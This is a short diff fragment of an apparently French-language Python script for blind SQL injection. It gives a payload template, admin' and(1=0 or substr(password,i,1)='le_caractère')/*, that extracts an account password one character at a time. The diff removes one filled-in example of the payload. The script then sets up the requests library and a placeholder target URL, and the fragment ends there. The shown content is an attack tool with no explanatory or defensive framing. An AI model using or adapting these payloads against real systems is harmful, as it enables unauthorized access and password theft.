@@ -10,8 +10,6 @@
 '''Trouver le ième caractère du champ souhaité:'''
 #admin' and(1=0 or substr(password,i,1)='le_caractère')/*
 
-#admin' and(1=0 or substr(password,1,1)='e')/*
-
 import requests
  
 url = 'lien_du_site'
